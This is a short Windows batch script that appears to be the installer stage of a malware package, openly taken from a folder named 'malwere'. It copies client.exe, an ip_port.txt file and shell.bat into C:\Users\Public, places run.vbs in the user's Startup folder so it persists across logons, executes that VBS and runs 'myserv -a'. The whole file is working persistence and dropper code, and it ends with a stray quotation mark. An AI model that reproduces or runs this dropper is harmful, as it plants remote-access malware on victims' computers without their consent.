@echo off
cd /d %~dp0
REM Copy the file using PowerShell
set "destinationFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
powershell -Command "Copy-Item 'main\malwere\ip_port.txt' 'C:\Users\Public\'"
powershell -Command "Copy-Item 'main\malwere\client.exe' 'C:\Users\Public\'"
powershell -Command "Copy-Item 'main\shell.bat' 'C:\Users\Public\'"
powershell -Command "Copy-Item 'main\run.vbs' '%destinationFolder%'"




cscript "C:\Users\Public\run.vbs"


REM Run the myServ command
cmd /c "myserv -a"
"